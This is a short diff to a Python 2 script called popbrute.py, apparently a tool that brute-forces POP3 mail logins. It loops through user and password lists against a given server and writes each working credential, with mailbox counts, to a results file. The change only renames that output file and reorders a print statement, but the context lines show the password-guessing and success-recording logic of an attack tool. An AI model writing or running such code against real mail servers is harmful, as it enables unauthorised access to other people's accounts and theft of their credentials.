@@ -5,7 +5,7 @@ import time
 if len(sys.argv) !=6:
 	print "\tUsage: ./popbrute.py <userlist> <wordlist> <port> <server> <@example.com> \n"
 	sys.exit(1)
-success1 = open('mailsuccess.txt','w')
+success1 = open('mailsuccess1.txt','w')
 user = sys.argv[1]
 words = sys.argv[2]
 port = sys.argv[3]
@@ -34,8 +34,8 @@ for mail_user in userlist:
 			if auth.split(' ')[0] == "+OK" or auth =="+OK": 
 				res = (mail_user,mail_pass,popserver.stat()[0],popserver.stat()[1]) 
 				success.append(res)
-				print>>success1,success
 				print success
+				print>>success1,success
 				popserver.quit() 
 				break
 			else : 
